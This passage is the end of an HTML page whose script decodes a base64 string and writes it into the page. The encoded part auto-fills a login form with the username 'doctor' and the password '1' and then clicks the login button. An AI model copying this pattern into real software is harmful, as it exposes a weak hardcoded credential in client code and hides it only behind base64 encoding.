JBp4buBbiB0aMO0bmcgdGluIMSRxINuZyBuaOG6rXANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnZG9jdG9yJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnMSc7ICANCiAgICAgICAgICAgIC8vIFThu7EgxJHhu5luZyBi4bqlbSDEkcSDbmcgbmjhuq1wDQogICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKS5jbGljaygpOw0KICAgICAgICAgICAgfSwgMTAwKTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOw0KPC9zY3JpcHQ+DQo8L2h0bWw+";
  const binary = atob(base64);
  const bytes = new Uint8Array([...binary].map(c => c.charCodeAt(0)));
  const decoded = new TextDecoder("utf-8").decode(bytes);
  document.write(decoded);
</script>
</body>
</html>
